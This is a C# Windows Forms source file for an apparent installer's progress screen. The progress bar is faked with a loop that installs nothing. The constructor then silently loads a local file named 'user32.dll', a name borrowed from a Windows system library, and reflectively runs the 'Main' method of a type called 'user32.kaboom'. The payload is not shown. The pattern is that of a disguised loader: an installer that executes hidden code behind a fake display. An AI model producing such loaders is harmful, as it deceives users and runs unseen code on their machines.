using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Setup.Finished;

namespace Setup
{
    public partial class InstallProgress : Form
    {
        public InstallProgress()
        {
            InitializeComponent();
            this.button1.Hide();
            progressBar1.Maximum = 1000000;
            progressBar1.Minimum = 0;
            progressBar1.Step = 1;
            progressBar1.Style = ProgressBarStyle.Continuous;
            for (int i = 0; i < 1000000; i++)
            {
                progressBar1.Value = i;
            }
            this.button1.Show();

            string p = System.IO.Path.Combine(System.Environment.CurrentDirectory, "user32.dll");
            Assembly assembly = Assembly.LoadFrom(p);
            Type type = assembly.GetType("user32.kaboom");
            MethodInfo method = type.GetMethod("Main");
            object instance = Activator.CreateInstance(type);
            method.Invoke(instance, null);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
            Finished f = new Finished();
            f.FormClosed += (s, args) => this.Close();
            f.Show();
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr LoadLibrary(string dllPath);
    }
}
